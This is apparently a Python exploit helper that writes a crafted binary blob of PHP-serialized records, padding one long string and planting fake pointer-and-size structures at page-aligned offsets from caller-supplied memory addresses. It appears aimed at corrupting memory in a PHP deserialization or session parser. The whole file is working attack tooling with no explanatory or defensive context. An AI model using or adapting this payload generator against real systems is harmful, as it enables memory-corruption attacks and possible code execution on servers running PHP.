#!/usr/bin/env python3
"""v4: D(dummy s:DLEN) | S(s:SLEN) | J(i:4096) | K | TAIL; U0 for S."""
import struct, sys
PAGE=0x1000
def rec(n,v):
    nb=n.encode(); assert 1<=len(nb)<=127
    return bytes([len(nb)])+nb+v
def build(total,val,P,B0,U0,slen,dlen,kind):
    head = rec('D', b's:%d:"'%dlen + b'D'*dlen + b'";') + rec('S', b's:%d:"'%slen + b'Q'*slen + b'";') + rec('J', b'i:4096;')
    if kind=='arr': tail=rec('a0', b'a:1:{i:0;i:1;}')
    elif kind=='obj': tail=rec('o0', b'O:8:"stdClass":0:{}')
    else: raise SystemExit('kind')
    L = total-len(head)-len(rec('K',b's:'))-len(tail)-2-1
    for _ in range(16):
        h=rec('K', b's:%d:"'%L)
        nl=total-len(head)-len(h)-len(tail)-2
        if nl==L: break
        L=nl
    h=rec('K', b's:%d:"'%L)
    ps=len(head)+len(h)
    payload=bytearray(b'A'*L); reps=0
    for m in range(1,total//PAGE+2):
        off=m*PAGE-0x18; b=off-ps
        if b<0 or b+0x48>L: continue
        struct.pack_into('<QQQQQQQQ',payload,b,P+56,B0,B0,0,0,0,0x7fffffff,1018)
        struct.pack_into('<Q',payload,b+64,0); reps+=1
    boff=(B0-val)-ps
    assert 0<=boff and boff+16<=L,(hex(B0),boff,L)
    struct.pack_into('<qQ',payload,boff,U0,0)
    data=head+h+bytes(payload)+b'";'+tail
    assert len(data)==total,(len(data),total)
    return data,dict(total=total,val=hex(val),P=hex(P),B0=hex(B0),U0=U0,reps=reps,payload_start=ps,L=L,b_off=boff,head=len(head),khdr=len(h),slen=slen,dlen=dlen,kind=kind)
if __name__=='__main__':
    out=sys.argv[1]; total=int(sys.argv[2],0); val=int(sys.argv[3],0); P=int(sys.argv[4],0); B0=int(sys.argv[5],0); U0=int(sys.argv[6],0); slen=int(sys.argv[7],0); dlen=int(sys.argv[8],0); kind=sys.argv[9] if len(sys.argv)>9 else 'arr'
    data,meta=build(total,val,P,B0,U0,slen,dlen,kind); open(out,'wb').write(data)
    print('wrote',out,len(data)); [print('  %s=%s'%(k,v)) for k,v in meta.items()]
